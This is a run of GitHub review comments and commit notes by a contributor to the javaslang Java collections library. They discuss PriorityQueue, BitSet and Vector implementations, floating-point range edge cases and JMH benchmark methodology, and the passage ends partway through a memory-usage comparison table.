Seq as inserting to a given index doesn't really make sense.\nMade it a Traversable\n. This was the cause for the horrible slowdown\n. this caused the stack overflow and 2300x slowdown in my other PR\n. make it inclusive by incrementing it with a ULP\nNote: this will make exclusive infinities not possible (had to modify a test for that), but I think an exclusive equality to infinity is strange anyway\n. unified the rest to match the double one\n. it's simpler this way ...\n. Instead of checking for constant conditions inside the loop, let's make two versions, and ascending and a descending -- simplified implementation significantly\n. same as super\n. inverted to match similar method below\n. same complexity, but easier to understand\n. a one element list is the same as its reverse also\n. Moved to Iterator, because now iteration is possible for elements where the ulp > step (i.e. when i == i+1) -- therefore these contain multiple elements now\n. semantics have slightly changed, please validate them agains the old tests\n. no closed infinite range\n. @danieldietrich, @ruslansennov, opinions?\n. Try this in your groovy/java console:\nGroovy\ndouble i = 10000000000000000\nprintln i == i + 1          // true\nprintln Math.nextUp(i) - i  // 2.0\n. I needed the existing comparator to create new instances of the PriorityQueue, but wanted it to be callable for normal Comparators also, so the constructor accepted the Java one and converted it inside.\n. they are package private:\nJava\n    PriorityQueueBase(Comparator<T> comparator, List<Node<Ranked<T>>> forest) {\n        this.comparator = SerializableComparator.of(comparator);\n        this.forest = forest;\n    }\n. Scala seems to use BigDecimal under the hood - the problem is with the CPU floating point representation, I think we should try to make it as intuitive as possible.\n@danieldietrich, @ruslansennov: What would a user find more intuitive:\n- a loop that stops before the end because consecutive numbers have a greater distance than the step size\n- if it stepped bigger in the last few steps\n- if it's slower (uses BigDecimal) and has a few consecutive values that are equal?\n. Maybe, but these things will only manifest for extremely big and small numbers together.\n. I think that people shouldn't use Double in these extreme ranges, if they don't know how it works.\nFloating point arithmetic is a bitch, there are no good calls here in my opinion, just compromises.\n. Double should never be used for money :)\n. I know, but isn't an int / long (with a fixed or stored scale) faster for that?\n. https://books.google.ro/books?id=ka2VUBqHiWkC&pg=PA219#v=onepage&q&f=false\n. // TODO\n. Sure, good idea, please commit your benchmarks and I'll extend it :)\nAlso note that there is an exiting issue about benchmarks: https://github.com/javaslang/javaslang/issues/725\nWould be awesome to find out where the actual optimizations would be needed :).\nMaybe we could do the benching in the way the tests are organized, i.e. polymorphically instead of hard coding every method separately.\n@eduardmanas, @danieldietrich, @ruslansennov, opinion? \n. > What is the performance of the current implementation vs java.util.PriorityQuote\nIt's about ~6x slower now\n\nThis operation is unnecessary when you call PriorityQueueBase#with internally\n\nExcellent idea, applied it :)\nUnfortunately non-mispredicted ifs seem to be extremely fast, this only gained ~2%, but at least the code became cleaner. Thanks :)\n. The beginning of the article explains it, it makes O(1) merge possible: https://en.wikipedia.org/wiki/Binomial_heap\n. the most important methods first\n. internally (via the helper class) it's stateless and closer to the original functional implementation\n. make it inclusive by incrementing it with a ULP\nNote: this will make exclusive infinities not possible (had to modify a test for that), but I think an exclusive equality to infinity is strange anyway\n. Instead of checking for constant conditions inside the loop, let's make two versions, and ascending and a descending -- simplified implementation significantly\n. these tests have slightly changed, please compare them against the new impl\n. https://github.com/javaslang/javaslang/issues/1309\n. Great idea, fixed, thanks.\nWill push later.\n. You're right, I was prematurely optimizing :).\nDone.\n. iterator takeRight will use a Queue, which has 2 Lists ... for now I will leave it as it is\n. unfolded a few tailrecursive methods\n. Thanks :)\n. Applied your suggestion to all forward iterating methods, thanks :)\n. making size calculation constant was pretty easy, insert adds one, merge is the sum of the two and tail subtracts one :)\n. if we make a small queue of the elements and merge it with the original (instead of adding them one-by-one to the original), the complexity will depend on the number of added elements and not on the size of the original tree (I think :)) ... it got quicker, so I guess I'm right :p)\nNow the tests show that it's only 3-4x slower than the reference impl :D\n. add more variation\n. another tailrec unrolling by separating it into two methods (it's also a lot simpler to understand)\n. it was easier to debug it this way\n. a == b if a contains b and b contains a and a.length == b.length:\n[1, 2] containsAll [1, 1] and [1, 2].length == [1, 1].length(), yet they're not equal\n. this way they appear in the correct order in the code\n. comparing the speeds of sorting 1000 and 1_000_000 elements\n. disabled GCs, but this is here, just in case it needs to be enabled\n. stack of 1/2 gb :D ... it seems that Scalaz doesn't use tail recursion, where it should have\n. using Scala from Java is pretty awkward :/\n. after understanding what these methods -- specified in the original paper -- do, I managed to unroll and inline them, saving many stacks and Tuple wrappings\n. yup\n. I just checked Closure's solution, it caches all hashcodes :/.\nI think we should optimize more for speed, memory is cheap :/\n. Please check its usages, it makes the code a lot more readable (and will be JITed anyway).\ne.g.\njava\nconcat(tree0, concat(tree1, tree2.getChildren()));\ninstead of\njava\ntree2.getChildren().prepend(tree1).prepend(tree0);\nwhere the order is all wrong and there are no whitespaces delimiting the separate parts.\n. If it were lazy (either via Lazy or via a local, non-locked variable), it would only be calculated IF it were used as a key.\n. I understand your point of view.\nI think there is another side also, namely that you also don't want to explain to a Java guy why this HashMap is 100x slower.\n\nwhich may have a performance impact\n\nYes, but so does calculating the hashes. I'm not suggesting we SHOULD cache them, just awareness that both choices are bad :)\n. @danieldietrich, these guys need to sleep somewhere\n. Fixed with force push.\n. I guess my helper methods aren't the only one who don't know where to sleep :p\n. That probably won't be the smallest value which has infinite for toDouble, but it might not really matter anyway :)\n. Yeah, many tests are failing that way, e.g. shouldCreateRangeClosedByWhereFromIsLessThanToAndStepCorrectDirection\n. If we don't provide the minimum value for which double conversion yields infinity, ranges can contain multiple MAX_VALUEs, until they reach infinity (and beyond)\n\n. The boundaries can quickly be calculated using binary search:\n``` java\nprivate BigDecimal binarySearch(BigDecimal finite, BigDecimal infinite) {\n    while (true) {\n        final BigDecimal magicValue = finite.add(infinite).divide(BigDecimal.valueOf(2), HALF_UP);\n        if (Double.isInfinite(magicValue.doubleValue())) {\n            if (magicValue.equals(infinite)) {\n                return magicValue;\n            }\n            infinite = magicValue;\n        } else {\n            finite = magicValue;\n        }\n    }\n}\n@Test\npublic void infinityAndBeyond() {\n    final BigDecimal finite = BigDecimal.valueOf(Double.MAX_VALUE);\n    final BigDecimal infinite = BigDecimal.valueOf(2).pow(Double.MAX_EXPONENT + 1);\nfinal BigDecimal negative = binarySearch(finite.negate(), infinite.negate());\nassertThat(negative.add(BigDecimal.ONE).doubleValue()).isNotEqualTo(Double.NEGATIVE_INFINITY);\nassertThat(negative.doubleValue()).isEqualTo(Double.NEGATIVE_INFINITY);\n\nfinal BigDecimal positive = binarySearch(finite, infinite);\nassertThat(positive.subtract(BigDecimal.ONE).doubleValue()).isNotEqualTo(Double.POSITIVE_INFINITY);\nassertThat(positive.doubleValue()).isEqualTo(Double.POSITIVE_INFINITY);\n\n}\n```\nwe could calculate and store this value in a static block / field.\nI'm still trying to figure out why 179769313486231580793728971405303415079934132710037826936173778980444968292764750946649017977587207096330286416692887910946555547851940402630657488671505820681908902000708383676273854845817711531764475730270069855571366959622842914819860834936475292719074168444365510704342711559699508093042880177904174497792 is so special :p\n. pushed this, @danieldietrich, please advise on where it should be moved\n. How should I make PQ final, as currently I need an Empty instance so that it throws a different exception for  head and tail (the tests asserted it)?\n. done\n. done\n. done\n. It crashes the Java compiler\n. Done, thanks.\n. Though I'm not sure how to test it now, as it generates a warning :/\n``` java\n@Test\npublic void infinityAndBeyond() {\n    final BigDecimal negativeInfinity = asDecimal(Double.NEGATIVE_INFINITY);\n    assertThat(negativeInfinity.add(BigDecimal.ONE).doubleValue()).isNotEqualTo(Double.NEGATIVE_INFINITY);\n    assertThat(negativeInfinity.doubleValue()).isEqualTo(Double.NEGATIVE_INFINITY);\nfinal BigDecimal positiveInfinity = asDecimal(Double.POSITIVE_INFINITY);\nassertThat(positiveInfinity.subtract(BigDecimal.ONE).doubleValue()).isNotEqualTo(Double.POSITIVE_INFINITY);\nassertThat(positiveInfinity.doubleValue()).isEqualTo(Double.POSITIVE_INFINITY);\n\n}\n``\n. You're right, rookie mistake :)\n. oups, this was faulty, I presumed thatt1 :: t2 :: restmeant 3 elements, though rest can also be an empty list, of course :)\n.findMincan be reused here andreduceis too costly\n. this should rather be changed to a custom tree node to simplify code significantly\n. Done, with further minor optimizations.\n. I think it was reversed\n. @danieldietrich, is this ok? We need to inherit the defaultisNotNull...\n. changed all the code references to take advantage of the new API method\n. nice example of why I recommended introducing this method\n. Now thatPriorityQueuebenchmarks are merged in, this may be problematic, as we haveScalaZalso :/\nCould you maybe use itsScaladependency, as I did?\n. Would it be possible to merge this nice formatter with the one I just pushed?\nThey might be doing similar things.\n. Please consider delimiting tests with separate internal classes instead, as was done withPriorityQueueBenchmark. Really nice and careful class, I like your style :) :+1: \n. wouldn't it be better in the reverse, i.e. 5 warmups and 2 measurements?\n. --ea` seems dangerous\n- sure you need a stack that ginormous?\n. I think you should lock down the random, otherwise you're not testing the same thing for every run\njava\nnew Random(0);\n. could you please put mutable and persistent in their names, so that we know when we're comparing apples to oranges? Also, it might make the benchmark quicker, if we don't rebuild the non-mutable ones\n. please consider extracting group names to constants (e.g. to avoid accidental typos).\nHow do Groups work exactly, aren't they wormed up together? Are we sure we want that?\nWe can do the grouping in separate subclasses also, as done in PriorityQueueBenchmark.\n. could we not measure Integer.toString here?\nMaybe make it a TreeMap<Integer, Integer>?\n. Would it be possible to fully qualify this instance also?\n. why is this in the same group as the puts? Why would you want to compare the speeds of puts against the speeds of gets?\n. is it possible to eliminate random generation here, i.e. generate everything beforehand and only acces the array?\nIt seems more expensive than the actual method itself :/\n. ... also, how can we be sure it's the exact same sequence as for the other methods?\n. This push seems expensive in comparison, please consider ~~a pre-allocated ArrayList~~ xoring the results instead (or consuming it with a BlackHole)\n. you should be able to make a for loop out of this one also, I think :/ (for consistency)\n. the primitive parameters seem confusing (true, ..., true), could we extract them to constants with names representing their intentions?\n. hmm, why do we have an assert here, but not elsewhere?\nAlso, there may be asserts in the production code also, it's the reason I disabled assertions and changed these to checks and exceptions.\n. I wish I were this motivated to write JavaDoc :D\n. hmm, are we using nulls now?\n. I find primitive parameters very confusing, e.g.\njava\ncalculate(true, 1, false)\nCould we restructure it to avoid them?\n. whenever the value of a variable is the same as it's name, I find it a code smell.\nIt's extracted to a variable, because I should be able to change it (without renaming it also).\nPlease rename to reflect the intention, not the value :)\n. could we have numbers instead of these weird random names, please :)?\n. I need ScalaZ, as it's the only persistent alternative for PriorityQueue.\n\ntest against other implementations such as Functional Java or PCollections instead\n\nGood idea, added a PR for comparing performance of List's add and iteration: https://github.com/javaslang/javaslang/pull/1321\n. I think this is very important, especially in cases where the resulting data structure will end up looking differently.\nThis is not a property based test. We don't want to have different structures for each run, because then you cannot compare subsequent results.\nI would like to stress again: performance tests should really be deterministic!\n. You don't have to rebuild immutable structures, that's all I was trying to say :).\nAlso, you don't want to \"get lucky\" or \"get unlucky\", you want predictability!\n. yeah, but that's my problem exactly, that libraries that will almost never be in the same classpath will end up being warmed up together.\nI think groups make our performance tests more unreliable and don't have any added value -- besides being quicker, apparently.\nPlease put validity checks in the performance tests also, so that we can check whether we're testing the same things (see my solution)\n. > so it should cancel itself out\nNot really, 2/1 = 2x quicker, while (2+10)/(1+10)=1.1x quicker. The constant factor changes the ratio.\nThis is also very important, please eliminate all unrelated calculations :).\n. Again, please make deterministic performance tests :)\n. If I send you a bottle, will you write my JavaDocs also?\n. java\nmax().get()\n. is this the same as head, as last was max?\nIf yes, please express it in code also (i.e. reuse).\n. Why don't you use a Set then, instead of a half Map?\n. I think that we're creating this library because we all agree that the JDK way often sux :).\nI would appreciate if I wouldn't have to check implementation details for methods that read like the one above (calculate(true, 1, false)), i.e. if nothing else, please create an\njava\nenum Inclusion { INCLUSIVE, EXCLUSIVE }\nand use it instead of the boolean :).\n. what are my options from GitHub for checking what this true means?\n. I find it very strange that we're returning a half-empty Tuple :/\n. > Haven't you seen Coach Carter? ;)\nExamples should be cross-cultural, e.g. numbers, like the ones you provided, but with better naming (i.e. not the same as the content, but representing why it was chosen or how it will be used, i.e. its intention, not its content (:).\ne.g. minimumValue, smallValue, bigvalue, maximumValue or something like that :)\n. :)\n. We shouldn't know about so many implementation details at this stage, could we hide this (e.g. by returning a Set instead, or in the worst case duplicate the key as a value)?\n. Hmm, I still don't understand why we would return a Tuple with the second value missing.\nWhy not return Tuple.of(key, value) or just return key?\n. Ok, but if we don't need a value, why does the internal entries require one? Why isn't\njava\npublic Option<Tuple2<K, V>> ceiling(K key) {\n    return entries.ceiling(key);\n}\nsuffice? If you strongly think the problem is on my side, let me know and will pull your change locally and investigate :)\n. Why are we following that interface? List doesn't implement Collection either.\nAgain, isn't our mission statement to follow Scala and not Java, as that's what we're actually trying to fix?\n. I agree, they're important. What I didn't agree with were primitive parameters, as they can be quite confusing to read.\nCan't we simply have inclusive params only? Please take a look at range implementations, they don't have booleans. I think if the name ended with closed, it was inclusive, or something.\nLet's wait for @danieldietrich's opinion :)\n. for the @RegExp annotation\n. Lists need more foreplay than others\n. xor is faster than adding to a list, so it doesn't distort the ratios and provides a very basic validation also\n. @danieldietrich, this wasn't tested so I presumed it wasn't working before either :p\n. this way we have O(1): head, tail, init, drop, dropRight, dropWhile, dropUntil, take, takeRight, takeWhile, takeUntil\n. eliminated recursion inside a foldLeft to make it debuggable and avoid problems with the stack\n. it's apparently faster this way :/\n. this line was the main motivation of this change :)\n. I think this was a wrong copy-paste here, it was testing List also :/\n. That was done previously, but when I know the index is 0 I can spare the index checks, probably those 3-4 ifs make it measurably quicker, as it's inherently a very fast operation.\n. Yes, I thought I already inlined them :).\nThe cast is needed as you can't index arrays with longs.\n. You can serialize the entire object now, I think this was testing that the interface is non-serializable, just its implementations. Please correct me.\n. If I'm mistaken correctly, only a few classes are currently decomposable to head and tail, so I took the liberty of not making a separate nil object for List - though we will probably have to update pattern logic to accommodate.\n. can we decompose e.g. (Priority)Queue head and tail also?\n. > An empty PriorityQueue has no head\nAn empty List doesn't have a head either. If we can decompose a List, we should be able to decompose any Traversable - it should be possible to base it on isEmpty or to provide separate empty classes for (FYI: https://github.com/javaslang/javaslang/pull/1300#discussion_r61717723).\n. This change started as a benchmark experiment, pushed it and said that it's \"controversial\" and that I will gladly split it into many, more cohesive commits, if needed; I pushed it to gather comments. Though I expected something else than \"dude, you're not supposed to touch that, because that's how Haskell and Scala did it, so it's the way we should do it also - even if it might not be the best solution in Java\".\nWill split it into more commits.\n. only display ratios that have slang on either side, i.e. I don't care about scala_persistent/java_mutable\n. iterate via head and tail, as that will be optimized in another commit\n. Changed the result aggregator to be similar to JMHs style, used by @eduardmanas also :)\n. weakened\n. create more contention during testing also\n. Please consider something like: @Fork(value = 1, jvmArgsAppend = { \"-server\", \"-XX:+UseG1GC\", \"-Xss100m\", \"-Xms4g\", \"-Xmx4g\", \"-XX:+PrintGC\", \"-XX:MaxGCPauseMillis=1000\", \"-XX:+UnlockExperimentalVMOptions\", \"-XX:G1NewSizePercent=100\", \"-XX:G1MaxNewSizePercent=100\", \"-disableassertions\" })\n. I strongly think that assertions should always be disabled, we certainly don't want to test the speed of them in production code accidentally.\n. Nice abstraction, good job! :)\n. was this done on purpose?\n. minor suggestion: instead of using abbreviations and misspellings of words (cla_zz_), could we please rename to reflect the intention, i.e. Class<T> enumClass?\n. :+1: for enums :)\n. java\n@return A {@link javaslang.collection.BitSet} Collector\n. f ~~are~~ is null?\n. same\n. ~~Boolean~~ boolean values\n. I think all of these should be primitives in the doc also, especially since that's how there are written in the first lines\n. drop(1) ?\n. shouldn't takeWhile take care of this already?\n. hmmm, maybe we should introduce a toBitSet to Value also\n. could you please explain what these TODOs mean?\n. minor: could you please else if mutually exclusive branches\n. are we using the sign bit also for storage?\nDo we need a >> or >>>?\nWould this change if later we decide that negative indices mean indexing from the end somehow (not sure how it could be done in this case, though)?\n. - unset is clear in Java, is it different in Scala?\n- could we have a toggle also (via xor)?\n. could we return the original in case of equality? Or it's unreasonable in this case?\n. nice, it's linear in elements, right :)?\n. this may be slow, as I think a Queue is backing the iterator()\n. nice :)\n. if we implement that offset we mentioned, we could even map negative elements here with a negative offset :)\n. could we extract all the 1L << element to something like private int indexOf(element)?\n. :+1: for not using dropRight here\n. hmmm, this seams linear to the number of possible elements, and not to the existing ones.\nSince this is an essential method, could we rather return a custom Iterator that uses Long.highestOneBit to find the next bit in constant time for a block and jump through unset blocks the same way via values[i] != 0 or something? It would still be linear, but should be a lot faster :/\n. I think this should rather be stored, it's the way we do it elsewhere and should be possible to do it in constant time :)\n. minor: I think enhanced for loops are a bit cheaper (no lambda) and are just as readable\n. minor: can be a one-liner via:\nJava\nreturn o == this || o instanceof BitSet && Collections.equals(this, (Iterable) o);\n. Not sure if it's more readable or not, just an alternative one-liner instead of 899-902:\njava\nlong[] arr = new long[Math.max(getWordsNum(), wordsNum)];\n. what does this branch mean exactly, seems weird for me :/\nShouldn't we throw an exception instead?\n. could you please invert the if, usually the guard is in the first branch throughout the codebase :)\n. same, \njava\nlong[] arr = new long[Math.max(getWordsNum(), wordsNum)];\n. merge else if?\n. same :)\n. same\n. please else if this line to make it obvious that we have multiple exits\n. could we use an AtomicLong instead of a synchronized test class?\n. true?\n. :+1: \n. - < 64\n- < 264\n- >= 264\n? we may include it in the comments or the values to make it obvious why the numbers were chosen\n. niiice :dancer: \n. It may be late for me to suggest it, but could we use Array<Long> here instead? It would take care of all the copying and it even has an offset and end now, many operations would be constant time for free :/\n. The iteration swings can be attributed to numerous other factors, context switching, cpu power saving, false sharing etc.\n. Will try to explain more clearly :).\nThere are expensive asserts in the production code also, e.g.: https://github.com/javaslang/javaslang/blob/master/javaslang/src/main/java/javaslang/collection/PriorityQueue.java#L535. We want to include these when we're testing correctness, but ignore them when we're testing speed :).\nJust run the PriorityQueue benchmark WITH assertions, and you'll understand the difference :)\n. could we use our own datastructures here instead of the mutable ones?\n. are you deliberately ignoring the 3rd parameter?\n. isn't this simply actual.equals(expected)?\njava\n    @Override\n    public boolean equals(Object o) {\n        if (o == this) {\n            return true;\n        } else if (!(o instanceof Tuple2)) {\n            return false;\n        } else {\n            final Tuple2<?, ?> that = (Tuple2<?, ?>) o;\n            return Objects.equals(this._1, that._1)\n                  && Objects.equals(this._2, that._2);\n        }\n    }\n. could you please prefix it with is, as I thought quickly that this method will generate illegal ranges :)\n. alternative:\njava\nreturn Math.min(a, b) < 0 || Math.max(a, b) > MAX_BIT;\n. You mean that you want to see exactly whether it was _1 or _2 that failed and equals would only show the end result without details?\n. ... and the shrink method, but that still might not be enough reason. You know the details, I just have some ideas :).\nThe advantage of Array would be that you could head, tail, drop, dropRight, take etc. in constant time, instead of linear, as it is currently.\n. because of the type, i.e empty character bitset vs empty enum bitset?\n. ... or we could express the offset in bits, instead of bytes :)\nBut that could of course be done in a separate commit, as we need a good feature coverage to pull that of without errors :)\n. Asserts are for internal state validation (white box), while tests are for black box.\nAlso, asserts can document the code or fail early at the client site, if used illegally, which we should know asap.\n. do we need this many, now that we don't have GCs during?\n. is there any reason for leaving the commented out code here?\n. Class<?> benchmarkClass?\n. do you think 10000 is unrealistic?\n. Internal asserts are meant for redundancy checks, i.e. that the stored size is the same as the calculated one.\nTests are not supposed to validate internals.\ne.g. how could you validate in a test that a tree is always balanced, complete or doesn't contain duplicates: via asserts that would get evaluated all the time, except when speed matters -- in production (or benchmarks).\nI happened to find a bug in PQ that no test caught (the output was the same, but stored in a sub-optimal way), once I introduced invariant assertions.\n. the method name is actually with lowercase, but I'm ok either way :)\n. Quick question: do you deliberately ignore the type of the Class, i.e. why no Class<?>?\n. :+1: \n. :+1: \n. wouldn't compile otherwise\n. 5 warmups aren't enough\n. we don't care about GC logs for dev runs\n. for linear data structures 1000 should be enough (fjava is too slow for larger sets)\n. this is the important part of the benchmark\n. extracted, in order for the mutable-to-persistent transformation only happens once\n. Aligned Array to Vector\n. it's safer this way\n. Until now the indexShift was only used as an offset for indices, i.e. if you deleted the first element, the first index became 1, so we had to subtract 1 for every index. Now the underlying HashArrayMappedTrie remains the same (i.e. structural sharing), and the internal indexing can be negative also (see prepend)\n. in case of append, we delete elements from the end, add the elements back with the correct index and update the length\n. Just because the length is constant at the moment, doesn't mean it won't change (i.e. it's an implementation detail that may change, and we don't want to update it later everywhere, just in the length method).\nEdit: it will be inlined anyway by the JIT\n. drop is O(1) now, we don't need to reindex every remaining element anymore :)\n. same, O(1)\n. optimized insert in front or back\n. unified access to the delegate for simplicity\n. delete all leftover elements from the beginning to be able to prepend the new ones in O(elements.size) time\n. let's reuse removeAt\n. same\n. optimized front and back removal to O(1)\n. reverse of a single or empty Vector should return itself\n. let's reuse slice\n. now it's O(1), it was linear\n. same\n. with will return empty() if it's empty:\njava\nif (length <= 0) {\n    return empty();\n}\n. final?\n. I'm not comfortable with hasNext throwing, instead of returning false in this case, since that's why I'm calling it :/\n. > All IOExceptions thrown be the InputStream are wrapped\nnot sure what this means\n. In my opinion it would be nicer if the return would simply be in in the try and the throw in the catch, so that it's obvious that there are multiple exits from the method, i.e.:\njava\n@Override\npublic boolean hasNext() {\n    try {\n        if (next == null) {\n            int i = reader.read();\n            if (i >= 0) {\n                next = (char) i;\n            }\n        }\n        return next != null;\n    } catch (IOException e) {\n        throw new UncheckedIOException(e);\n    }\n}\n. these were testing List, not applicable to Vector, since its Empty is not a separate class\n. thanks @ruslansennov \n. this is for testing that the benchmarks run correctly (enabling debugging also via fork = 0)\n. since this modifies the state, we have to recreate the original ArrayList every time\n. we're using it for development purposes more often\n. 10000 seemed to much for Functional Java\n. since there is no mutability here, we can define the state once in the base\n. kinda' hacky, alternatives are welcome\n. iteration is slow this way (seems O(n^2)), any ideas?\n. typo: which do not satisfy\n. this seems redundant, please provide a better explanation for the parameter\n. for development purposes these are \"good enough\", compared to their speed\n. we don't want to measure the speed of internal (production code) assertions\n. it seems more accurate to measure all the gets for all possible values, as the compiler seems to inline the value otherwise (for linked lists at least)\n. optimized slightly\n. no need to check this in every iteration as we're storing the sizes now :)\n. This seems to be the same as e.g.\njava\nList.ofAll(Iterator.iterate(10, x -> x - 1).takeWhile(x -> x > 0));\nWhich seems cleaner to me than the above example :/ (i.e. better separation of concerns)\n. It would be best if the display order would be the same as the order the groups were defined in, not alphabetically\n. same as in https://github.com/javaslang/javaslang/pull/1372\n. This is important @ruslansennov, @danieldietrich \n. same\n. test internals @ruslansennov \n. Sure, though I need the benchmarks to be merged first, otherwise I don't know what to optimize.\nI keep adding commits to this, because they depend on others that aren't merged yet :).\n. This should have been:\njava\nreturn (length >= maskedAreaLength) ? result : result.map(Function.identity())\n. This should have been:\njava\nreturn (length >= maskedAreaLength) ? result : result.map(Function.identity())\n. This should have been:\njava\n@Test\npublic void shouldPeriodicallyTrimExcess() {\n    Set<Integer> sizes = TreeSet.empty();\n    for (Vector<Integer> values = range(0, 100); !values.isEmpty(); values = values.tail()) {\n        final int length = values.length(), delegateLength = values.delegate.size();\n        if (length != delegateLength) {\n            sizes = sizes.add(delegateLength);\n        }\n    }\n    assertThat(sizes).isEqualTo(TreeSet.of(100, 49, 24, 11, 5, 2));\n}\n. made it public static, it should be optimized away by the warmup (checked and the assertions weren't active, if WITH_ASSERTS was false\n. \n. this form was needed because of non-final variables\n. I'm currently working on optimizing vector by rewriting it to a bit-mapped vector trie.\nCreation, getting elements at given indices and iteration is working.\nget is currently ~2.5x faster than Clojure and ~1.3x faster than Scala. This will probably deteriorate once I extend it with append, prepend and update.\n@danieldietrich, please assingn the corresponding issue to me.\n. is it possible to exclude Slice from bigger CONTAINER_SIZEs?\n. @danieldietrich, this commit modifies production code also (i.e. all the groupBy methods are unified and changed to keep insertion order.)\nIt's needed for the benchmarks to display the final results in the original order.\n. ~~It depends on other modifications in this PR.\nIf I put it as a separate PR, they will have to be merged in a given order, and many changes will be duplicated, in order for the PRs to make sense~~\nManaged to separate it to https://github.com/javaslang/javaslang/pull/1402, thanks.\n. There's no test for this\n. @ruslansennov \n. @emmanueltouzery \n. @paplorinc\n. @danieldietrich \n. https://github.com/javaslang/javaslang/issues/1377\n. unified all groupBy methods to use the same template\n. @danieldietrich, @ruslansennov, this is where the magic happens, i.e. all groupBys using a LinkedHashMap instead of a HashMap\n. I moved these to the default package to have access to the helper classes.\nI committed it separately, without modifications.\nIt's strange that Github doesn't recognize the moves in the aggregated view, only on commit-by-commit.\n. Good question.\nI followed the same logic as in choosing whether I want a test to\njava\npublic void test () throws Exception\nor\njava\npublic void test () throws SomeVerySpecificExceptionThatNobodyCaresAboutException\ni.e. the return type of a benchmark is meant as a dummy, to avoid dead code elimination, the returned element won't be used.\nIt's easier to ignore it as a user, if it's always an Object.\n(potential boxing (e.g. in iterate) shouldn't be a real problem, as the inside operations outweigh the cost).\n. I could rename it to aggregate, if that would help.\nIt's only used as validity check for iteration and get in the benchmarks to avoid dead code elimination.\n. It would be a mistake to run multiple benchmarks in parallel ...\n. The JVM should be smart enough to remove empty methods.\nThe problem with asserts was that production code could contain asserts also, making the benchmark totally unrealistic.\n. https://github.com/javaslang/javaslang/pull/1398/files#diff-bc2650bfeea8249083757f0dc0d0208aR48\n. AFAIK the JVM recompiles in those cases. If it takes the same path multiple times, it can even delete unused (but valid) else statements (don't quote me on that :p).\n``` java\npublic static class DeadCode {\n    @Benchmark\n    public Object a() {\n        final String s = new Exception().getStackTrace().toString();\n        require(() -> s.toLowerCase().toUpperCase().contains(\".\"));\n        return s;\n    }\n@Benchmark\npublic Object b() {\n    final String s = new Exception().getStackTrace().toString();\n    return s;\n}\n\npublic static void require(BooleanSupplier... suppliers) {\n    if (WITH_ASSERTS) {\n        for (int i = 0; i < suppliers.length; i++) {\n            if (!suppliers[i].getAsBoolean()) {\n                throw new IllegalStateException(\"Failure in supplier #\" + (i + 1) + \"!\");\n            }\n        }\n    }\n}\n\n}\n```\ngave the results:\n```\npublic static boolean WITH_ASSERTS = true;\nBenchmark                    Mode  Cnt      Score      Error  Units\nVectorBenchmark.DeadCode.a  thrpt   30  75520.358 \u00b1  610.701  ops/s\nVectorBenchmark.DeadCode.b  thrpt   30  78450.526 \u00b1 1996.320  ops/s\n```\n```\npublic static boolean WITH_ASSERTS = false;\nBenchmark                    Mode  Cnt      Score      Error  Units\nVectorBenchmark.DeadCode.a  thrpt   30  79165.290 \u00b1  665.751  ops/s\nVectorBenchmark.DeadCode.b  thrpt   30  78259.776 \u00b1 1419.171  ops/s\n```\ni.e. they have the same speed when asserts are disabled.\n(EDITED)\n. @danieldietrich, @eduardmanas, you're both right :)\nfor\njava\nfinal String s = \"hello\";\nrequire(() -> !s.isEmpty());\nreturn s;\nthe difference is already measurable (though still quite low), i.e.:\nTarget           Operation   Impl            Params  Count            Score  \u00b1     Error    Unit      a      b\nVectorBenchmark  DeadCode    a                          12  277,539,221.199  \u00b1     0.54%   ops/s        0.90x\nVectorBenchmark  DeadCode    b                          12  308,182,430.575  \u00b1     0.90%   ops/s 1.11x\nHowever :) ...\nSince we've already disabled assertions for normal run, it would actually be a FEATURE to run the quick debug WITH ALL ASSERTIONS enabled :D.\nI didn't realize this until now, thanks for your help. Will change all require calls to assertions (tested it with JMH, they're indeed completely eliminated)\n. These can be considered constants.\n. Thanks, this just became obsolete anyway :)\n. @danieldietrich\n. @eduardmanas \n. inlined in next commit\n. @danieldietrich \n. @danieldietrich \n. @eduardmanas, removed these assertions you asked some time ago :)\n. this is a lot cleaner this way :)\n. @danieldietrich, to avoid boxing\n. all benchmarks (in quick debug mode) with all asserts are run at every build (+3 minutes)\n. @danieldietrich, @ruslansennov, @eduardmanas we don't need this anymore, right?\n. I really hate Maven :(\n. All warnings had to be suppressed for the Maven compile\n. debug will display less garbage this way\n. gc logs are more structured this way\n. needs to be public so that I can get the name of the field via reflection :)\n. Should I apply this to the other collections also?\n@danieldietrich, @ruslansennov, @eduardmanas?\n(please see the results for Vector above, in the commit message)\n. For displaying the name of the field in the message, without needing to specify it in a String also\n. > How reliable is to measure memory usage in a JVM?\nThis measures the bytes occupied by a given object - it's not affected by the GC (if you can measure it, it's not collected yet)\n. of course, stack overflow for not doing tail-call optimizations :p\n. Sure, I don't mind undeleting code that I wrote :p\n. the thorough run takes 3 hours, didn't compare them like that, but since we have GC after each run, we don't need 4g anymore (my laptop has 8g and had to close Chrome sometimes to run the tests -> hence I tested whether it's working correctly with 2g also)\n. Thank you for the thorough review, I appreciate it :).\nI tested it and it seems to be working, probably the identity hash is enough in this case (make sense, since I'm usually referencing existing methods here).\nIf you are against caching, I will remove it, though pcollecections and fjava constructions are really slow for big values :/\n. 2:10m vs. 2:20m ... the code has spoken, the caching shall be removed (the create function kept)\n. e.g. for Vector:\n``\nfor 32 elementsjava.util.ArrayListuses504 bytes(0 bytesoverhead,0.0bytes overhead per element)scala.collection.immutable.Vectoruses536 bytes(32 bytesoverhead,1.0bytes overhead per element)clojure.lang.PersistentVectoruses704 bytes(200 bytesoverhead,6.2bytes overhead per element)org.pcollections.TreePVectoruses1.7 KB(1.2 KBoverhead,38.8bytes overhead per element)fj.data.Sequses3 KB(2.5 KBoverhead,80.0bytes overhead per element)javaslang.collection.Vectoruses1.6 KB(1.1 KBoverhead,35.2` bytes overhead per element)\nfor 1024 elements\n    java.util.ArrayList uses 18.6 KB (0 bytes overhead, 0.0 bytes overhead per element)\n    scala.collection.immutable.Vector uses 19.3 KB (672 bytes overhead, 0.7 bytes overhead per element)\n    clojure.lang.PersistentVector uses 20 KB (1.4 KB overhead, 1.4 bytes overhead per element)\n    org.pcollections.TreePVector uses 54.7 KB (36.1 KB overhead, 36.1 bytes overhead per element)\n    fj.data.Seq uses 102.3 KB (83.7 KB overhead, 83.7 bytes overhead per element)\n    javaslang.collection.Vector uses 58.8 KB (40.1 KB overhead, 40.1 bytes overhead per element)\nfor 32768 elements\n    java.util.ArrayList uses 638.4 KB (0 bytes overhead, 0.0 bytes overhead per element)\n    scala.collection.immutable.Vector uses 659 KB (20.7 KB overhead, 0.6 bytes overhead per element)\n    clojure.lang.PersistentVector uses 683.8 KB (45.4 KB overhead, 1.4 bytes overhead per element)\n    